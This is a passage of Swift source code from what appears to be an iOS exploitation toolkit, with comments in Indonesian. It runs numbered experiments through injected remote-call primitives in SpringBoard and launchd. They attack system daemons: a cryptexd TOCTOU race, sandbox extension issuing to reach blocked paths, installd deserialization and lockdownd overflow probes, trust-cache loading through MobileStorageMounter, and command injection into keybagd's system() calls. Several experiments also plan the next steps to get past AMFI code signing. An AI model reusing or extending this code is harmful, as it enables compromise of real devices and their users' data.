            return SpawnResult(success: false, log: log, exitCode: -1, signal: -1, stdout: "")
        }
    }

    /// fork + execve with waitpid
    private func forkExecAndCapture(rc: RemoteCall, binaryPath: String, mem: UInt64) -> SpawnResult {
        var log = ""
        let binAddr = remote_alloc_str(rc, binaryPath)
        let argvBase = mem + 0x500
        rc[argvBase].setValue64(binAddr)
        rc[argvBase + 8].setValue64(0)

        let childPid = RootExecutor.rcall(rc, "fork")
        log += "  fork() = \(childPid)\n"

        if childPid == 0 {
            // Child process — execve
            RootExecutor.rcall(rc, "execve", binAddr, argvBase, 0)
            RootExecutor.rcall(rc, "_exit", 127)
            RootExecutor.rcall(rc, "free", binAddr)
            return SpawnResult(success: false, log: log + "  (in child, execve returned)\n", exitCode: 127, signal: 0, stdout: "")
        } else if childPid != UInt64(bitPattern: -1) {
            // Parent — wait for child
            let statusAddr = mem + 0x490
            rc[statusAddr].setValue32(0)
            RootExecutor.rcall(rc, "waitpid", childPid, statusAddr, 0)
            let st = rc[statusAddr].value32()
            let sig = Int32(st & 0x7F)
            let code = Int32(st >> 8)

            log += "  child exit: signal=\(sig), code=\(code)\n"

            RootExecutor.rcall(rc, "free", binAddr)

            if sig == 9 {
                log += "  ❌ SIGKILL by AMFI\n"
                return SpawnResult(success: false, log: log, exitCode: code, signal: sig, stdout: "")
            } else if sig == 0 && code != 127 {
                log += "  ✅ execve SUCCESS\n"
                return SpawnResult(success: true, log: log, exitCode: code, signal: sig, stdout: "")
            } else {
                log += "  ⚠️ execve likely failed (code=127 means execve returned)\n"
                return SpawnResult(success: false, log: log, exitCode: code, signal: sig, stdout: "")
            }
        } else {
            let err = remote_errno(rc)
            log += "  fork() FAILED: errno=\(err)\n"
            RootExecutor.rcall(rc, "free", binAddr)
            return SpawnResult(success: false, log: log, exitCode: -1, signal: -1, stdout: "")
        }
    }

    // MARK: - Exp 94: Heap Trust Cache Scan

    // MARK: - Dead-end experiments 94-95, 79/80 duplicates REMOVED
    // Exp 94: Heap TC scan � merged into Exp 77/82
    // Exp 95: cs_enforcement_disable � kernel __DATA panic
    // Exp 79/80 duplicates removed (originals kept above)

    // MARK: - Exp 101: cryptexd TOCTOU Race

    /// cryptexd uses access() before open() — TOCTOU race condition.
    /// Also 15x symlink operations — symlink race attack vector.
    private func expCryptexdTOCTOU(sb: RemoteCall) -> ExperimentResult {
        let expName = "cryptexd TOCTOU (Exp 101)"
        var detail = "Experiment 101: cryptexd TOCTOU Race\n"
        detail += "======================================\n\n"
        detail += "cryptexd: access() + open() = TOCTOU race\n"
        detail += "15x symlink ops — symlink attack vector\n\n"

        let mem = sb.trojanMem
        let RTLD_DEFAULT = UInt64(bitPattern: -2)

        // Resolve XPC functions
        let xpcCreate = RootExecutor.rcall(sb, "dlsym", RTLD_DEFAULT,
                                           remote_alloc_str(sb, "xpc_connection_create_mach_service"))
        let xpcResume = RootExecutor.rcall(sb, "dlsym", RTLD_DEFAULT,
                                           remote_alloc_str(sb, "xpc_connection_resume"))
        let xpcDictEmpty = RootExecutor.rcall(sb, "dlsym", RTLD_DEFAULT,
                                             remote_alloc_str(sb, "xpc_dictionary_create"))
        let xpcSetStr = RootExecutor.rcall(sb, "dlsym", RTLD_DEFAULT,
                                           remote_alloc_str(sb, "xpc_dictionary_set_string"))
        let xpcSendReply = RootExecutor.rcall(sb, "dlsym", RTLD_DEFAULT,
                                             remote_alloc_str(sb, "xpc_connection_send_message_with_reply_sync"))

        guard xpcCreate != 0 && xpcDictEmpty != 0 else {
            detail += "❌ XPC functions not available\n"
            return ExperimentResult(name: expName, success: false, detail: detail, timestamp: Date())
        }

        // Try connect to cryptexd
        let services = ["com.apple.security.cryptexd", "com.apple.cryptexd"]
        var conn: UInt64 = 0
        for svc in services {
            let s = remote_alloc_str(sb, svc)
            let c = RootExecutor.rcallAddr(sb, xpcCreate, s, 0, 0)
            detail += "[\(svc)]: 0x\(String(format: "%llx", c))\n"
            RootExecutor.rcall(sb, "free", s)
            if c != 0 { conn = c; break }
        }

        if conn == 0 {
            detail += "\n❌ Cannot connect to cryptexd\n"
            detail += "Service mungkin butuh entitlement khusus\n"
            return ExperimentResult(name: expName, success: false, detail: detail, timestamp: Date())
        }

        RootExecutor.rcallAddr(sb, xpcResume, conn)
        detail += "\n✅ Connected! Sending race messages...\n\n"

        // Setup race files
        let tcPath = remote_alloc_str(sb, "/private/var/tmp/.race_tc")
        let fd = RootExecutor.rcall(sb, "open", tcPath, UInt64(O_WRONLY | O_CREAT | O_TRUNC), 0o644)
        if fd != UInt64(bitPattern: -1) {
            sb[mem + 0x800].setValue32(2)
            sb[mem + 0x804].setValue64(0)
            sb[mem + 0x80C].setValue64(0)
            sb[mem + 0x814].setValue32(1)
            sb[mem + 0x818].setValue64(0xDEADBEEFCAFEBABE)
            RootExecutor.rcall(sb, "write", fd, mem + 0x800, 48)
            RootExecutor.rcall(sb, "close", fd)
        }

        // Send messages with path to our TC
        var gotReply = false
        for i in 0..<5 {
            let msg = RootExecutor.rcallAddr(sb, xpcDictEmpty, 0, 0, 0)
            guard msg != 0 else { detail += "  msg[\(i)]=NULL\n"; continue }

            if xpcSetStr != 0 {
                let k1 = remote_alloc_str(sb, "path")
                RootExecutor.rcallAddr(sb, xpcSetStr, msg, k1, tcPath)
                RootExecutor.rcall(sb, "free", k1)
            }

            if xpcSendReply != 0 {
                let reply = RootExecutor.rcallAddr(sb, xpcSendReply, conn, msg)
                detail += "  msg[\(i)]: reply=0x\(String(format: "%llx", reply))\n"
                if reply != 0 { gotReply = true }
            }
        }

        RootExecutor.rcall(sb, "unlink", tcPath)
        RootExecutor.rcall(sb, "free", tcPath)

        detail += "\n=== VERDICT ===\n"
        detail += gotReply ? "✅ Got replies from cryptexd!\n" : "❌ No replies\n"
        return ExperimentResult(name: expName, success: gotReply, detail: detail, timestamp: Date())
    }

    // MARK: - Exp 102: xpcproxy sandbox_extension_issue

    /// xpcproxy can issue sandbox extensions + has setuid.
    /// If we can get it to issue us an extension, we bypass sandbox.
    private func expXpcproxySandbox(sb: RemoteCall) -> ExperimentResult {
        let expName = "xpcproxy Sandbox (Exp 102)"
        var detail = "Experiment 102: xpcproxy sandbox_extension_issue\n"
        detail += "==================================================\n\n"
        detail += "xpcproxy: sandbox_extension_issue (2x) + setuid (3x)\n"
        detail += "XPC tanpa entitlement check!\n\n"

        let RTLD_DEFAULT = UInt64(bitPattern: -2)

        // Try sandbox_extension_issue_file directly from SB
        let sbExtIssue = RootExecutor.rcall(sb, "dlsym", RTLD_DEFAULT,
                                            remote_alloc_str(sb, "sandbox_extension_issue_file"))
        let sbExtConsume = RootExecutor.rcall(sb, "dlsym", RTLD_DEFAULT,
                                             remote_alloc_str(sb, "sandbox_extension_consume"))

        detail += "sandbox_extension_issue_file: 0x\(String(format: "%llx", sbExtIssue))\n"
        detail += "sandbox_extension_consume: 0x\(String(format: "%llx", sbExtConsume))\n\n"

        var anySuccess = false

        if sbExtIssue != 0 {
            // Try issuing extension for various paths
            let paths = [
                "/private/var/tmp/",
                "/usr/libexec/",
                "/private/var/containers/Bundle/",
                "/private/var/mobile/",
            ]

            // sandbox_extension_issue_file(type, path, flags)
            // type: "com.apple.app-sandbox.read" etc
            let extTypes = [
                "com.apple.app-sandbox.read",
                "com.apple.app-sandbox.read-write",
                "com.apple.sandbox.executable",
            ]

            for extType in extTypes {
                let typeAddr = remote_alloc_str(sb, extType)
                for path in paths {
                    let pathAddr = remote_alloc_str(sb, path)
                    let token = RootExecutor.rcallAddr(sb, sbExtIssue, typeAddr, pathAddr, 0)
                    if token != 0 {
                        detail += "✅ Extension issued: \(extType) → \(path)\n"
                        detail += "   token ptr: 0x\(String(format: "%llx", token))\n"
                        anySuccess = true

                        // Try consuming it
                        if sbExtConsume != 0 {
                            let handle = RootExecutor.rcallAddr(sb, sbExtConsume, token)
                            detail += "   consume handle: \(Int64(bitPattern: handle))\n"
                        }
                    } else {
                        detail += "❌ \(extType) → \(path): NULL\n"
                    }
                    RootExecutor.rcall(sb, "free", pathAddr)
                }
                RootExecutor.rcall(sb, "free", typeAddr)
            }
        }

        detail += "\n=== VERDICT ===\n"
        if anySuccess {
            detail += "🎉 Sandbox extensions issued!\n"
            detail += "Ini bisa dipakai untuk akses path yang biasanya blocked\n"
        } else {
            detail += "❌ Tidak bisa issue sandbox extension dari SpringBoard\n"
            detail += "SB mungkin sudah unsandboxed (tidak perlu extension)\n"
        }

        return ExperimentResult(name: expName, success: anySuccess, detail: detail, timestamp: Date())
    }

    // MARK: - Exp 103: installd NSKeyedUnarchiver deserialization

    /// installd uses NSKeyedUnarchiver — deserialization attack.
    /// Has com.apple.private.MobileInstallation entitlement.
    private func expInstalldDeserial(sb: RemoteCall) -> ExperimentResult {
        let expName = "installd Deserial (Exp 103)"
        var detail = "Experiment 103: installd Deserialization\n"
        detail += "==========================================\n\n"
        detail += "installd: NSKeyedUnarchiver (2x)\n"
        detail += "Has: com.apple.private.MobileInstallation\n"
        detail += "Has: com.apple.private.amfi\n\n"

        let RTLD_DEFAULT = UInt64(bitPattern: -2)

        // Connect to installd XPC
        let xpcCreate = RootExecutor.rcall(sb, "dlsym", RTLD_DEFAULT,
                                           remote_alloc_str(sb, "xpc_connection_create_mach_service"))
        let xpcResume = RootExecutor.rcall(sb, "dlsym", RTLD_DEFAULT,
                                           remote_alloc_str(sb, "xpc_connection_resume"))
        let xpcDictEmpty = RootExecutor.rcall(sb, "dlsym", RTLD_DEFAULT,
                                             remote_alloc_str(sb, "xpc_dictionary_create"))
        let xpcSetStr = RootExecutor.rcall(sb, "dlsym", RTLD_DEFAULT,
                                           remote_alloc_str(sb, "xpc_dictionary_set_string"))
        let xpcSetData = RootExecutor.rcall(sb, "dlsym", RTLD_DEFAULT,
                                            remote_alloc_str(sb, "xpc_dictionary_set_data"))
        let xpcSendReply = RootExecutor.rcall(sb, "dlsym", RTLD_DEFAULT,
                                             remote_alloc_str(sb, "xpc_connection_send_message_with_reply_sync"))

        guard xpcCreate != 0 && xpcDictEmpty != 0 else {
            detail += "❌ XPC functions not available\n"
            return ExperimentResult(name: expName, success: false, detail: detail, timestamp: Date())
        }

        let services = ["com.apple.mobile.installd", "com.apple.installd"]
        var conn: UInt64 = 0
        for svc in services {
            let s = remote_alloc_str(sb, svc)
            let c = RootExecutor.rcallAddr(sb, xpcCreate, s, 0, 0)
            detail += "[\(svc)]: 0x\(String(format: "%llx", c))\n"
            RootExecutor.rcall(sb, "free", s)
            if c != 0 { conn = c; break }
        }

        if conn == 0 {
            detail += "\n❌ Cannot connect to installd\n"
            return ExperimentResult(name: expName, success: false, detail: detail, timestamp: Date())
        }

        RootExecutor.rcallAddr(sb, xpcResume, conn)
        detail += "\n✅ Connected to installd!\n\n"

        // Send various commands to probe the service
        let commands = ["Lookup", "Install", "Browse", "ListApps", "CheckCapability"]
        var gotReply = false

        for cmd in commands {
            let msg = RootExecutor.rcallAddr(sb, xpcDictEmpty, 0, 0, 0)
            guard msg != 0 else { continue }

            if xpcSetStr != 0 {
                let k = remote_alloc_str(sb, "Command")
                let v = remote_alloc_str(sb, cmd)
                RootExecutor.rcallAddr(sb, xpcSetStr, msg, k, v)
                RootExecutor.rcall(sb, "free", k)
                RootExecutor.rcall(sb, "free", v)
            }

            if xpcSendReply != 0 {
                let reply = RootExecutor.rcallAddr(sb, xpcSendReply, conn, msg)
                detail += "  [\(cmd)]: reply=0x\(String(format: "%llx", reply))\n"
                if reply != 0 { gotReply = true }
            }
        }

        detail += "\n=== VERDICT ===\n"
        detail += gotReply ? "✅ installd responds to commands!\n" : "❌ No replies\n"
        detail += "NEXT: Craft NSKeyedArchiver payload untuk trigger deserialization\n"

        return ExperimentResult(name: expName, success: gotReply, detail: detail, timestamp: Date())
    }

    // MARK: - Exp 104: lockdownd strcpy overflow probe

    /// lockdownd uses strcpy() (2 refs) — buffer overflow potential.
    /// Also has kSecAttrAccessibleAlways keychain items.
    private func expLockdowndOverflow(sb: RemoteCall) -> ExperimentResult {
        let expName = "lockdownd Overflow (Exp 104)"
        var detail = "Experiment 104: lockdownd strcpy Overflow\n"
        detail += "============================================\n\n"
        detail += "lockdownd: strcpy() (2x) — no bounds check\n"
        detail += "Has: kSecAttrAccessibleAlways (keychain always accessible)\n"
        detail += "Has: com.apple.private.tcc (TCC bypass)\n\n"

        let RTLD_DEFAULT = UInt64(bitPattern: -2)

        // Connect to lockdownd
        let xpcCreate = RootExecutor.rcall(sb, "dlsym", RTLD_DEFAULT,
                                           remote_alloc_str(sb, "xpc_connection_create_mach_service"))
        let xpcResume = RootExecutor.rcall(sb, "dlsym", RTLD_DEFAULT,
                                           remote_alloc_str(sb, "xpc_connection_resume"))
        let xpcDictEmpty = RootExecutor.rcall(sb, "dlsym", RTLD_DEFAULT,
                                             remote_alloc_str(sb, "xpc_dictionary_create"))
        let xpcSetStr = RootExecutor.rcall(sb, "dlsym", RTLD_DEFAULT,
                                           remote_alloc_str(sb, "xpc_dictionary_set_string"))
        let xpcSendReply = RootExecutor.rcall(sb, "dlsym", RTLD_DEFAULT,
                                             remote_alloc_str(sb, "xpc_connection_send_message_with_reply_sync"))

        guard xpcCreate != 0 && xpcDictEmpty != 0 else {
            detail += "❌ XPC functions not available\n"
            return ExperimentResult(name: expName, success: false, detail: detail, timestamp: Date())
        }

        let services = ["com.apple.lockdownd", "com.apple.mobile.lockdown"]
        var conn: UInt64 = 0
        for svc in services {
            let s = remote_alloc_str(sb, svc)
            let c = RootExecutor.rcallAddr(sb, xpcCreate, s, 0, 0)
            detail += "[\(svc)]: 0x\(String(format: "%llx", c))\n"
            RootExecutor.rcall(sb, "free", s)
            if c != 0 { conn = c; break }
        }

        if conn == 0 {
            detail += "\n❌ Cannot connect to lockdownd\n"
            return ExperimentResult(name: expName, success: false, detail: detail, timestamp: Date())
        }

        RootExecutor.rcallAddr(sb, xpcResume, conn)
        detail += "\n✅ Connected!\n\n"

        // Probe with normal-length strings first (safe)
        detail += "=== Safe probes (normal length) ===\n"
        let probes = ["GetValue", "QueryType", "Pair", "ValidatePair"]
        var gotReply = false

        for probe in probes {
            let msg = RootExecutor.rcallAddr(sb, xpcDictEmpty, 0, 0, 0)
            guard msg != 0 else { continue }
            if xpcSetStr != 0 {
                let k = remote_alloc_str(sb, "Request")
                let v = remote_alloc_str(sb, probe)
                RootExecutor.rcallAddr(sb, xpcSetStr, msg, k, v)
                RootExecutor.rcall(sb, "free", k)
                RootExecutor.rcall(sb, "free", v)
            }
            if xpcSendReply != 0 {
                let reply = RootExecutor.rcallAddr(sb, xpcSendReply, conn, msg)
                detail += "  [\(probe)]: reply=0x\(String(format: "%llx", reply))\n"
                if reply != 0 { gotReply = true }
            }
        }

        // Probe with medium-length string (128 bytes — safe, just testing)
        detail += "\n=== Medium string probe (128 bytes) ===\n"
        let medStr = String(repeating: "A", count: 128)
        let msg2 = RootExecutor.rcallAddr(sb, xpcDictEmpty, 0, 0, 0)
        if msg2 != 0 && xpcSetStr != 0 {
            let k = remote_alloc_str(sb, "Request")
            let v = remote_alloc_str(sb, medStr)
            RootExecutor.rcallAddr(sb, xpcSetStr, msg2, k, v)
            RootExecutor.rcall(sb, "free", k)
            RootExecutor.rcall(sb, "free", v)
            if xpcSendReply != 0 {
                let reply = RootExecutor.rcallAddr(sb, xpcSendReply, conn, msg2)
                detail += "  128-byte Request: reply=0x\(String(format: "%llx", reply))\n"
                if reply != 0 { gotReply = true }
            }
        }

        detail += "\n=== VERDICT ===\n"
        detail += gotReply ? "✅ lockdownd responds!\n" : "❌ No replies\n"
        detail += "strcpy overflow perlu string > buffer size (biasanya 256-1024)\n"
        detail += "⚠️ Overflow test TIDAK dilakukan (bisa crash lockdownd)\n"
        detail += "NEXT: Reverse lockdownd untuk cari exact buffer size\n"

        return ExperimentResult(name: expName, success: gotReply, detail: detail, timestamp: Date())
    }

    // MARK: - Exp 105: MobileStorageMounter deep XPC probe

    /// MobileStorageMounter: punya TC load entitlement + XPC tanpa auth check.
    /// Deep probe: cari exact XPC message format yang diterima.
    private func expMSMXPC(sb: RemoteCall) -> ExperimentResult {
        let expName = "MSM XPC Deep (Exp 105)"
        var detail = "Experiment 105: MobileStorageMounter Deep XPC\n"
        detail += "================================================\n\n"
        detail += "MSM entitlements:\n"
        detail += "  • com.apple.private.amfi.can-load-trust-cache\n"
        detail += "  • com.apple.private.pmap.load-trust-cache\n"
        detail += "  • XPC tanpa entitlement check!\n\n"

        let mem = sb.trojanMem
        let RTLD_DEFAULT = UInt64(bitPattern: -2)

        let xpcCreate = RootExecutor.rcall(sb, "dlsym", RTLD_DEFAULT,
                                           remote_alloc_str(sb, "xpc_connection_create_mach_service"))
        let xpcResume = RootExecutor.rcall(sb, "dlsym", RTLD_DEFAULT,
                                           remote_alloc_str(sb, "xpc_connection_resume"))
        let xpcDictEmpty = RootExecutor.rcall(sb, "dlsym", RTLD_DEFAULT,
                                             remote_alloc_str(sb, "xpc_dictionary_create"))
        let xpcSetStr = RootExecutor.rcall(sb, "dlsym", RTLD_DEFAULT,
                                           remote_alloc_str(sb, "xpc_dictionary_set_string"))
        let xpcSetInt = RootExecutor.rcall(sb, "dlsym", RTLD_DEFAULT,
                                           remote_alloc_str(sb, "xpc_dictionary_set_int64"))
        let xpcSetBool = RootExecutor.rcall(sb, "dlsym", RTLD_DEFAULT,
                                            remote_alloc_str(sb, "xpc_dictionary_set_bool"))
        let xpcSetData = RootExecutor.rcall(sb, "dlsym", RTLD_DEFAULT,
                                            remote_alloc_str(sb, "xpc_dictionary_set_data"))
        let xpcSendReply = RootExecutor.rcall(sb, "dlsym", RTLD_DEFAULT,
                                             remote_alloc_str(sb, "xpc_connection_send_message_with_reply_sync"))
        let xpcGetStr = RootExecutor.rcall(sb, "dlsym", RTLD_DEFAULT,
                                           remote_alloc_str(sb, "xpc_dictionary_get_string"))

        guard xpcCreate != 0 && xpcDictEmpty != 0 else {
            detail += "❌ XPC functions not available\n"
            return ExperimentResult(name: expName, success: false, detail: detail, timestamp: Date())
        }

        // Connect
        let svcAddr = remote_alloc_str(sb, "com.apple.mobile.storage_mounter")
        let conn = RootExecutor.rcallAddr(sb, xpcCreate, svcAddr, 0, 0)
        RootExecutor.rcall(sb, "free", svcAddr)

        guard conn != 0 else {
            detail += "❌ Cannot connect to MSM\n"
            return ExperimentResult(name: expName, success: false, detail: detail, timestamp: Date())
        }

        RootExecutor.rcallAddr(sb, xpcResume, conn)
        detail += "✅ Connected to com.apple.mobile.storage_mounter\n\n"

        // Try various XPC message formats based on reverse engineering
        detail += "=== Probing message formats ===\n"

        let messageFormats: [(String, [(String, String)])] = [
            ("LookupImage", [("Command", "LookupImage"), ("ImageType", "Developer")]),
            ("MountImage", [("Command", "MountImage"), ("ImageType", "Developer")]),
            ("CopyDevDiskImage", [("Command", "CopyDevDiskImage")]),
            ("PersonalizeImage", [("Command", "PersonalizeImage")]),
            ("LoadTrustCache", [("Command", "LoadTrustCache")]),
            ("QueryNonce", [("Command", "QueryNonce")]),
            ("QueryPersonalizationManifest", [("Command", "QueryPersonalizationManifest")]),
            ("RollNonce", [("Command", "RollNonce")]),
            ("UnmountImage", [("Command", "UnmountImage")]),
        ]

        var anyReply = false
        var replyDetails: [(String, UInt64)] = []

        for (name, kvPairs) in messageFormats {
            let msg = RootExecutor.rcallAddr(sb, xpcDictEmpty, 0, 0, 0)
            guard msg != 0 else { continue }

            for (key, value) in kvPairs {
                if xpcSetStr != 0 {
                    let k = remote_alloc_str(sb, key)
                    let v = remote_alloc_str(sb, value)
                    RootExecutor.rcallAddr(sb, xpcSetStr, msg, k, v)
                    RootExecutor.rcall(sb, "free", k)
                    RootExecutor.rcall(sb, "free", v)
                }
            }

            if xpcSendReply != 0 {
                let reply = RootExecutor.rcallAddr(sb, xpcSendReply, conn, msg)
                detail += "  [\(name)]: reply=0x\(String(format: "%llx", reply))\n"
                if reply != 0 {
                    anyReply = true
                    replyDetails.append((name, reply))

                    // Try to read error string from reply
                    if xpcGetStr != 0 {
                        let errKey = remote_alloc_str(sb, "Error")
                        let errStr = RootExecutor.rcallAddr(sb, xpcGetStr, reply, errKey)
                        if errStr != 0 {
                            // Read string from remote
                            var errBytes: [UInt8] = []
                            for i: UInt64 in 0..<64 {
                                let b = sb[errStr + i].value8()
                                if b == 0 { break }
                                errBytes.append(b)
                            }
                            let errString = String(bytes: errBytes, encoding: .utf8) ?? "?"
                            detail += "    Error: \(errString)\n"
                        }
                        RootExecutor.rcall(sb, "free", errKey)
                    }
                }
            }
        }

        detail += "\n=== VERDICT ===\n"
        if anyReply {
            detail += "🎉 MobileStorageMounter RESPONDS to commands!\n"
            detail += "Responded to \(replyDetails.count) commands\n"
            detail += "Commands: \(replyDetails.map { $0.0 }.joined(separator: ", "))\n\n"
            detail += "CRITICAL: MSM punya entitlement load-trust-cache\n"
            detail += "Jika kita bisa craft valid PersonalizeImage/LoadTrustCache message,\n"
            detail += "MSM akan load trust cache kita ke kernel!\n\n"
            detail += "NEXT STEPS:\n"
            detail += "1. Cari format PersonalizeImage yang valid\n"
            detail += "2. Craft trust cache dengan CDHash binary kita\n"
            detail += "3. Kirim via LoadTrustCache command\n"
        } else {
            detail += "❌ MSM tidak respond (mungkin butuh USB/pairing state)\n"
        }

        return ExperimentResult(name: expName, success: anyReply, detail: detail, timestamp: Date())
    }

    // MARK: - Exp 106: Sandbox Executable Extension + Spawn

    /// Exp 102 berhasil issue sandbox.executable extension.
    /// FIXED: Pakai launchd RC untuk copy file (SB tidak bisa baca rootfs).
    /// SB RC hanya untuk: sandbox extension + spawn (minimal calls = no watchdog).
    private func expSandboxExecSpawn(sb: RemoteCall) -> ExperimentResult {
        let expName = "Sandbox Exec Spawn (Exp 106)"
        var detail = "Experiment 106: Spawn with Sandbox Executable Extension\n"
        detail += "=========================================================\n\n"
        detail += "FIXED: launchd copy file, SB hanya extension+spawn\n\n"

        let mem = sb.trojanMem
        let RTLD_DEFAULT = UInt64(bitPattern: -2)

        // Step 1: Copy binary via LAUNCHD (bisa akses rootfs)
        detail += "=== Step 1: Copy binary via launchd RC ===\n"

        let dstPath = "/private/var/tmp/.exp106_id"
        let srcPath = "/usr/bin/id"
        var copyOK = false
        var copySize: UInt64 = 0

        let sem = DispatchSemaphore(value: 0)
        root.executeAsRoot(operation: "exp106_copy") { rc in
            let src = remote_alloc_str(rc, srcPath)
            let dst = remote_alloc_str(rc, dstPath)

            RootExecutor.rcall(rc, "unlink", dst)
            let srcFd = RootExecutor.rcall(rc, "open", src, UInt64(O_RDONLY), 0)
            let dstFd = RootExecutor.rcall(rc, "open", dst, UInt64(O_WRONLY | O_CREAT | O_TRUNC), 0o755)

            if srcFd != UInt64(bitPattern: -1) && dstFd != UInt64(bitPattern: -1) {
                let buf = rc.trojanMem + 0x2000
                for _ in 0..<256 {
                    let n = RootExecutor.rcall(rc, "read", srcFd, buf, 4096)
                    if n == 0 || n == UInt64(bitPattern: -1) { break }
                    RootExecutor.rcall(rc, "write", dstFd, buf, n)
                    copySize += n
                    if n < 4096 { break }
                }
                copyOK = copySize > 0
            }
            RootExecutor.rcall(rc, "close", srcFd)
            RootExecutor.rcall(rc, "close", dstFd)
            RootExecutor.rcall(rc, "chmod", dst, 0o755)

            // Also create symlink
            let linkPath = remote_alloc_str(rc, "/private/var/tmp/.exp106_link")
            RootExecutor.rcall(rc, "unlink", linkPath)
            RootExecutor.rcall(rc, "symlink", src, linkPath)
            RootExecutor.rcall(rc, "free", linkPath)

            RootExecutor.rcall(rc, "free", src)
            RootExecutor.rcall(rc, "free", dst)
            sem.signal()
            return (copyOK, "copy \(copySize)B", 0)
        }
        sem.wait()

        detail += copyOK ? "✅ Copied \(copySize) bytes: \(srcPath) → \(dstPath)\n" :
                           "❌ Copy failed\n"

        guard copyOK else {
            return ExperimentResult(name: expName, success: false, detail: detail, timestamp: Date())
        }

        // Step 2: Issue sandbox extensions (SB — minimal calls)
        detail += "\n=== Step 2: Issue sandbox.executable extension ===\n"

        let sbExtIssue = RootExecutor.rcall(sb, "dlsym", RTLD_DEFAULT,
                                            remote_alloc_str(sb, "sandbox_extension_issue_file"))
        let sbExtConsume = RootExecutor.rcall(sb, "dlsym", RTLD_DEFAULT,
                                             remote_alloc_str(sb, "sandbox_extension_consume"))

        if sbExtIssue != 0 && sbExtConsume != 0 {
            let extType = remote_alloc_str(sb, "com.apple.sandbox.executable")
            let pathAddr = remote_alloc_str(sb, "/private/var/tmp/")
            let token = RootExecutor.rcallAddr(sb, sbExtIssue, extType, pathAddr, 0)
            if token != 0 {
                let h = RootExecutor.rcallAddr(sb, sbExtConsume, token)
                detail += "✅ executable ext /var/tmp/ (handle=\(Int64(bitPattern: h)))\n"
            }
            RootExecutor.rcall(sb, "free", extType)
            RootExecutor.rcall(sb, "free", pathAddr)
        }

        // Step 3: Spawn tests (SB — 3 calls only)
        detail += "\n=== Step 3: Spawn tests ===\n"

        // Test A: spawn copied binary
        let (ret1, pid1, err1) = doSpawn(rc: sb, path: dstPath, mem: mem)
        detail += "A) spawn(copy): ret=\(ret1), pid=\(pid1), errno=\(err1)\n"
        if ret1 == 0 && pid1 != 0 {
            let (sig, code) = doWait(rc: sb, pid: pid1, mem: mem)
            detail += "   exit: signal=\(sig), code=\(code)\n"
            if sig != 9 { detail += "   🎉 NO SIGKILL!\n" }
        }

        // Test B: spawn via symlink (preserves CDHash)
        let (ret2, pid2, err2) = doSpawn(rc: sb, path: "/private/var/tmp/.exp106_link", mem: mem)
        detail += "B) spawn(symlink→id): ret=\(ret2), pid=\(pid2), errno=\(err2)\n"
        if ret2 == 0 && pid2 != 0 {
            let (sig2, code2) = doWait(rc: sb, pid: pid2, mem: mem)
            detail += "   exit: signal=\(sig2), code=\(code2)\n"
            if sig2 != 9 { detail += "   🎉 SYMLINK SPAWN SUCCESS!\n" }
        }

        // Test C: spawn /usr/bin/id directly from SB
        let (ret3, pid3, err3) = doSpawn(rc: sb, path: "/usr/bin/id", mem: mem)
        detail += "C) spawn(/usr/bin/id): ret=\(ret3), pid=\(pid3), errno=\(err3)\n"
        if ret3 == 0 && pid3 != 0 {
            let (sig3, code3) = doWait(rc: sb, pid: pid3, mem: mem)
            detail += "   exit: signal=\(sig3), code=\(code3)\n"
        }

        // Verdict
        detail += "\n=== VERDICT ===\n"
        let anySuccess = (ret1 == 0 && pid1 != 0) || (ret2 == 0 && pid2 != 0) || (ret3 == 0 && pid3 != 0)
        if anySuccess {
            detail += "✅ Spawn berhasil! Cek signal di atas.\n"
        } else {
            detail += "Spawn results:\n"
            detail += "  ret=8 = ENOEXEC (file bukan executable valid)\n"
            detail += "  ret=2 = ENOENT (file tidak ditemukan)\n"
            detail += "  ret=13 = EACCES (permission denied)\n"
            detail += "  ret=1 = EPERM (operation not permitted)\n"
            detail += "  pid=0 = proses tidak dibuat\n\n"
            detail += "Sandbox extension = filesystem access saja.\n"
            detail += "AMFI CDHash check = kernel level, bukan sandbox.\n"
            detail += "Extension tidak bypass code signing.\n"
        }

        return ExperimentResult(name: expName, success: anySuccess, detail: detail, timestamp: Date())
    }

    // MARK: - Exp 107: keybagd XPC Command Injection

    /// keybagd: system() (4x) + XPC tanpa auth + taint path confirmed
    /// XPC input → system() = command injection langsung!
    private func expKeybagdInject(sb: RemoteCall) -> ExperimentResult {
        let expName = "keybagd Inject (Exp 107)"
        var detail = "Experiment 107: keybagd XPC → system() Injection\n"
        detail += "==================================================\n\n"
        detail += "keybagd: system()(4x) + XPC tanpa auth!\n"
        detail += "Taint: xpc_dictionary_get_string → system()\n\n"

        let RTLD_DEFAULT = UInt64(bitPattern: -2)

        // Connect ke keybagd XPC
        let xpcCreate = RootExecutor.rcall(sb, "dlsym", RTLD_DEFAULT,
                                           remote_alloc_str(sb, "xpc_connection_create_mach_service"))
        let xpcResume = RootExecutor.rcall(sb, "dlsym", RTLD_DEFAULT,
                                           remote_alloc_str(sb, "xpc_connection_resume"))
        let xpcDictCreate = RootExecutor.rcall(sb, "dlsym", RTLD_DEFAULT,
                                              remote_alloc_str(sb, "xpc_dictionary_create"))
        let xpcSetStr = RootExecutor.rcall(sb, "dlsym", RTLD_DEFAULT,
                                           remote_alloc_str(sb, "xpc_dictionary_set_string"))
        let xpcSend = RootExecutor.rcall(sb, "dlsym", RTLD_DEFAULT,
                                         remote_alloc_str(sb, "xpc_connection_send_message"))

        guard xpcCreate != 0 && xpcDictCreate != 0 else {
            detail += "❌ XPC functions not available\n"
            return ExperimentResult(name: expName, success: false, detail: detail, timestamp: Date())
        }

        // Try connect
        let services = ["com.apple.keybagd.UserManager", "com.apple.keybagd", "com.apple.security.keybagd"]
        var conn: UInt64 = 0
        var connSvc = ""
        for svc in services {
            let s = remote_alloc_str(sb, svc)
            let c = RootExecutor.rcallAddr(sb, xpcCreate, s, 0, 0)
            detail += "[\(svc)]: 0x\(String(format: "%llx", c))\n"
            RootExecutor.rcall(sb, "free", s)
            if c != 0 && conn == 0 { conn = c; connSvc = svc }
        }

        guard conn != 0 else {
            detail += "\n❌ Tidak bisa connect ke keybagd\n"
            return ExperimentResult(name: expName, success: false, detail: detail, timestamp: Date())
        }

        RootExecutor.rcallAddr(sb, xpcResume, conn)
        detail += "\n✅ Connected: \(connSvc)\n\n"

        // Kirim message dengan command yang aman (touch file sebagai proof)
        // CATATAN: ini TIDAK berbahaya — hanya test apakah system() terpanggil
        let testCmd = "touch /private/var/tmp/.keybagd_exp107_proof"
        let commands = ["command", "cmd", "action", "operation", "request", "path"]
        
        detail += "=== Sending probe messages ===\n"
        for key in commands {
            let msg = RootExecutor.rcallAddr(sb, xpcDictCreate, 0, 0, 0)
            guard msg != 0 else { continue }
            if xpcSetStr != 0 {
